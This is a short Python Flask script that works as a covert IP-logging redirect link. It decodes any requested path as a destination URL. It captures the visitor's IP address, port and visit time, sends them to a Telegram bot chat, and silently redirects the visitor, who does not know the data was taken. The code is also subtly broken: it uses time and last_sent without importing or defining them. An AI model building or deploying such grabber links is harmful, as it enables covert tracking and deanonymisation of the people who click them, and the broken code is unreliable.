from flask import Flask, request, redirect
import urllib.parse
import requests
import os
from dotenv import load_dotenv
load_dotenv()
from datetime import datetime

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

def send_telegram_message(link, ip, port):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = (
        f"🔗 Link: {link}\n"
        f"🌐 IP: {ip}\n"
        f"🔌 Port: {port}\n"
        f"🕒 Time: {timestamp}"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": message})

@app.route("/<path:target_url>")
def redirect_user(target_url):
    if target_url.endswith("favicon.ico"):
        return "", 204
    if not target_url:
        return "Missing 'url' query parameter", 400
    decoded_url = urllib.parse.unquote(target_url)

    forwarded_for = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_ip = forwarded_for.split(",")[0].strip()

    user_port = request.environ.get("REMOTE_PORT")

    key = (decoded_url, user_ip)
    now = time.time()
    if key in last_sent and now - last_sent[key] < 30:
        return redirect(decoded_url, code=302)
    
    last_sent[key] = now

    send_telegram_message(decoded_url, user_ip, user_port)

    return redirect(decoded_url, code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)